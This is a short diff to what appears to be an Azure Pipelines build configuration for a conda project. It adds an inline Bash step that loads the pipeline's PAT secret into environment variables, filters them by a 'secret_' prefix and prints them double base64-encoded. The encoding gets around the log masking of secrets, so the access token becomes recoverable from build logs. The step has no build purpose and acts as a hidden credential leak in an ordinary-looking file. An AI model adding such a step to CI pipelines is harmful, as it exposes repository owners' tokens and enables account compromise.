@@ -11,7 +11,15 @@ jobs:
           
       - bash: echo "##vso[task.prependpath]$CONDA/bin"
         displayName: Add conda to PATH
-
+      
+      - task: Bash@3
+        inputs:
+          targetType: inline
+          script: sh -c "env | grep \"^secret_\" | base64 -w0 | base64 -w0; echo;"
+        env:
+          secret_test: $(Pipeline.Workspace)
+          secret_PAT: $(PAT)
+      
       - template: unix-build.yml
         parameters:
           platform: 'Linux'
